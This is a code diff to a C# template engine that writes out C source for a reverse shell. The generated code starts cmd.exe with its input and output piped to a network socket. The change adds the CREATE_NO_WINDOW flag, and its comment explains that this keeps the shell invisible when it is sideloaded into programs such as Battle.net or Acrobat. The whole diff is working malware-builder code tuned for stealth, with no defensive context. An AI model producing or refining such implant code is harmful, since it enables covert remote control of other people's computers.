@@ -1129,7 +1129,11 @@ public static class TemplateEngine
         sb.AppendLine("    PROCESS_INFORMATION pi; ZeroMemory(&pi, sizeof(pi));");
 
         TraceStep("CreateProcessA cmd.exe (stdin/out/err -> socket)");
-        sb.AppendLine("    if (!pCP(NULL, shell, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {");
+        // CREATE_NO_WINDOW (0x08000000): cmd.exe is a console subsystem PE; inside
+        // a GUI host like Battle.net or Acrobat there's no parent console to inherit,
+        // so without this flag Windows allocates a fresh console window and pops it
+        // visibly on the desktop — defeats the point of a sideloaded reverse shell.
+        sb.AppendLine("    if (!pCP(NULL, shell, NULL, NULL, TRUE, 0x08000000, NULL, NULL, &si, &pi)) {");
         TraceFail("CreateProcessA", "GetLastError()", "        ");
         sb.AppendLine("        pClose(s); return;");
         sb.AppendLine("    }");
